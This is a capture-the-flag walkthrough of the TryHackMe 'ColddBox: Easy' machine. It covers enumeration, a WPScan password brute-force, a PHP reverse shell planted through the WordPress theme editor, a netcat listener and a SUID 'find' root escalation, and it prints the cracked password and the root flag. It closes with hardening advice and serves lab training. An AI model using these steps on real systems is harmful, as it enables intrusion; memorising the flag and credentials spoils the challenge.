# ColddBox: Easy (THM) - WordPress Exploitation & SUID Privilege Escalation

**Platform:** TryHackMe | **Target OS:** Linux (Ubuntu) | **Difficulty:** Easy  
**Focus:** Open Source Intelligence (OSINT), WordPress Enumeration (WPScan), CMS Theme RCE (Reverse Shell), and GTFOBins SUID Exploitation (`find`).

---

## 🎯 Executive Summary
The "ColddBox: Easy" engagement simulates a realistic Web-to-OS compromise. By discovering a hidden directory, we successfully enumerated valid usernames. Leveraging this OSINT, a credential brute-force attack was launched against the WordPress login portal, yielding administrative access. We weaponized this access by modifying a core PHP theme file to execute a Reverse TCP Shell. Finally, local privilege escalation was achieved by exploiting a misconfigured SUID bit on the Linux `find` binary, granting a full Root shell.

---

## 1. Network Reconnaissance & OSINT

We initiated the attack surface mapping using `Nmap` and discovered a standard web stack.

```bash
$ nmap -sV -sC --top-ports 1000 -T4 10.112.144.130
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
```

Recognizing a heavily outdated WordPress installation (v4.1.31), we aggressively fuzzed the webroot using `Gobuster`.

```bash
$ gobuster dir -u http://10.112.144.130 -w common.txt -x php,html,txt
/hidden               (Status: 301) 
/wp-admin             (Status: 301) 
/wp-login.php         (Status: 200) 
```

**Intelligence Gathering (OSINT):**
Navigating to the `/hidden` directory exposed a plaintext message:
> "C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip"

*Finding:* This localized OSINT leaked three potential target usernames: `c0ldd`, `hugo`, and `philip`.

---

## 2. WordPress Exploitation & Initial Access

With valid usernames acquired, we utilized `WPScan` to launch a targeted dictionary attack against the WordPress XML-RPC/Login portals. 

```bash
$ wpscan --url http://10.112.144.130/ -U c0ldd -P passwords.txt
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

### Remote Code Execution (CMS Theme Abuse)
Authenticating to the `wp-admin` dashboard as `c0ldd` granted us administrative privileges over the CMS. 
To convert this web access into Operating System execution (RCE), we navigated to the **Theme Editor** (Appearance -> Editor). We selected the active "Twenty Fifteen" theme and injected a PHP Reverse Shell payload (by PentestMonkey) into the `404.php` template file.

We established a local Netcat listener and triggered the payload by navigating to a non-existent page mapped to the 404 template:
```bash
$ curl http://10.112.144.130/wp-content/themes/twentyfifteen/404.php
```

```bash
# Local Listener
$ nc -lnvp 4444
Connection received on 10.112.144.130 53848
$ whoami
www-data
```

---

## 3. Privilege Escalation: SUID Binary Abuse (`find`)

Operating as the `www-data` service account, we conducted a local enumeration scan for Set-Owner-User-ID (SUID) binaries to identify horizontal or vertical escalation vectors.

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
```

**Technical Analysis (The `find` SUID Flaw):**
The `/usr/bin/find` binary was improperly configured with the SUID bit, executing as `root`. The `find` utility features an `-exec` parameter, which executes arbitrary OS commands on files it discovers. By leveraging this feature, we can instruct `find` to execute a system shell. 
The inclusion of the `-p` (Preserve) flag is critical, as it forces the spawned `/bin/sh` instance to retain the Effective User ID (EUID=0) instead of dropping privileges.

```bash
$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root

# cat /root/root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

---

## 4. Defensive Remediation & Hardening

1. **WordPress Security:** 
   - Enforce strong password complexity rules to mitigate dictionary attacks.
   - Disable file editing within the WordPress dashboard by adding `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`. This completely neutralizes the Theme Editor RCE vector.
2. **Information Disclosure:** Ensure sensitive communications or developer notes (e.g., the `/hidden` directory) are not exposed to the public webroot.
3. **SUID Principle of Least Privilege:** Remove the SUID bit from the `/usr/bin/find` binary immediately, as it acts as a trivial Living-off-the-Land (LOLBin) escalation path:
   ```bash
   sudo chmod u-s /usr/bin/find
   ```